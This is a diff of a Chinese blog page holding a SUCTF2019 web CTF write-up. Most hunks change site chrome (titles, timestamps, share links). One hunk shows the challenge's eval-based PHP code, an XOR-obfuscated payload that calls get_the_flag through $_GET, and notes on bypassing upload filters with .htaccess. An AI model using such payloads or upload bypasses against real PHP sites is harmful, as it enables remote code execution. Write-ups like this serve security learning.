@@ -14,7 +14,7 @@
     
     
     
-    <title>SUCTF2019-WEB-WP | 七友&#39;s Blog | 七友</title>
+    <title>SUCTF2019-WEB-WP | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="theme-color" content="#3F51B5">
@@ -26,14 +26,14 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="SUCTF2019-WEB-WP">
 <meta property="og:url" content="https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/index.html">
-<meta property="og:site_name" content="七友&#39;s Blog">
+<meta property="og:site_name" content="七友">
 <meta property="og:description" content="前言正逢暑假的闲暇之余，和De1ta的师傅们打了一下suctf2019，下面记录一下web的题解 webCheckIn简单地看一下它过滤，大概有3个点：  不能上传ph结尾的文件， 上传的文件内容不能有&amp;lt;?， 用exif_imagetype函数检测上传文件是否为图片文件  第一反应是上传一个.htaccess，把其它文件格式解析为php文件，但是发现并不行，应该是apache的AllowOv">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190819205358-68c01f34-c280-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190819205512-95277afe-c280-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190819210604-19b8358c-c282-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190819210629-28d68316-c282-1.png">
-<meta property="og:updated_time" content="2019-08-20T03:47:51.947Z">
+<meta property="og:updated_time" content="2019-12-05T15:12:54.991Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SUCTF2019-WEB-WP">
 <meta name="twitter:description" content="前言正逢暑假的闲暇之余，和De1ta的师傅们打了一下suctf2019，下面记录一下web的题解 webCheckIn简单地看一下它过滤，大概有3个点：  不能上传ph结尾的文件， 上传的文件内容不能有&amp;lt;?， 用exif_imagetype函数检测上传文件是否为图片文件  第一反应是上传一个.htaccess，把其它文件格式解析为php文件，但是发现并不行，应该是apache的AllowOv">
@@ -106,14 +106,7 @@
             </li>
         
             <li class="waves-block waves-effect">
-              <a href="http://www.weibo.com/ysweb" target="_blank" >
-                <i class="icon icon-lg icon-weibo"></i>
-                Weibo
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/custom"  >
+              <a href="/friends"  >
                 <i class="icon icon-lg icon-link"></i>
                 测试
               </a>
@@ -271,7 +264,7 @@ user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 
@@ -279,15 +272,17 @@ user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果
     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?&gt;</span>
+<span class="token delimiter">?></span>
 </code></pre>
 <p>这题考察了php的复杂变量，但是做题时候一直没有get到这个点，我太难了，一直用类似这样的payload：<code>(x^x)</code>，<code>((x)^(x))</code>走了弯路，发现并没有解析。最后泽君师傅get到点了<br>payload为：</p>
 <pre><code>?_=${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag
+
 ```
 PS：``$_GET[0xff]``可以用``$_GET{0xff}``代替，正则绕过了，现在想办法上传文件，和``CheckIn``差不多，高兴的是这题的``.htaccess``文件可以用，难受的是之前`<script language="php">`用不了，于是找到了[这篇文章](https://thibaudrobin.github.io/articles/bypass-filter-upload/ "这篇文章")，改一下作者的脚本就行了
+
 ```python
 import requests
 
@@ -886,12 +881,12 @@ LABEL_8<span class="token punctuation">:</span>
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-08-20T03:47:51.947Z" itemprop="dateUpdated">2019-08-20 11:47:51</time>
+    最后更新时间：<time datetime="2019-12-05T15:12:54.991Z" itemprop="dateUpdated">2019-12-05 23:12:54</time>
 </span><br>
 
 
         
-        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/08/20/SUCTF2019-WEB-WP/" target="_blank" rel="external">https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/</a>
+        know it then hack it
         
     </div>
     
@@ -922,7 +917,7 @@ LABEL_8<span class="token punctuation">:</span>
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友's Blog&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -932,7 +927,7 @@ LABEL_8<span class="token punctuation">:</span>
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友's Blog&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -942,7 +937,7 @@ LABEL_8<span class="token punctuation">:</span>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SUCTF2019-WEB-WP》 — 七友's Blog&url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&via=https://byqiyou.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SUCTF2019-WEB-WP》 — 七友&url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&via=https://byqiyou.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
@@ -1088,7 +1083,7 @@ LABEL_8<span class="token punctuation">:</span>
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友's Blog&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -1098,7 +1093,7 @@ LABEL_8<span class="token punctuation">:</span>
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友's Blog&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&title=《SUCTF2019-WEB-WP》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -1108,7 +1103,7 @@ LABEL_8<span class="token punctuation">:</span>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SUCTF2019-WEB-WP》 — 七友's Blog&url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&via=https://byqiyou.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SUCTF2019-WEB-WP》 — 七友&url=https://byqiyou.github.io/2019/08/20/SUCTF2019-WEB-WP/&via=https://byqiyou.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
